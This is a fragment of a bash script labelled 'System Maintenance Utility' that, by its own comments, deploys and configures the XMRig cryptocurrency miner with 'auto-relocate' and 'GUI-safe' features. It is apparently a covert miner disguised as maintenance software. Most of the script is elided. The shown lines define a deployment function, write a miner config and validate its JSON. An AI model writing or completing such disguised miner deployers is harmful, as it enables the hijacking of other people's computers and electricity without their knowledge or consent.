#!/bin/bash
# System Maintenance Utility v9.0 FINAL
# Fix: XMRig 6.26 compatible config | GUI-safe | fallback official | auto-relocate
...
deploy_core() {
    ...
    # ─── STEP 4: Config XMRig v9 (minimal, XMRig 6.26 compatible) ───
...
CFGEOF
    ...
    # Verify config JSON valid
    if command -v python3 &>/dev/null; then
        python3 -m json.tool "$BASE/cfg/config.json" >/dev/null 2>&1 && log "[+] JSON valid" || log "[!] JSON RUSAK"
    fi
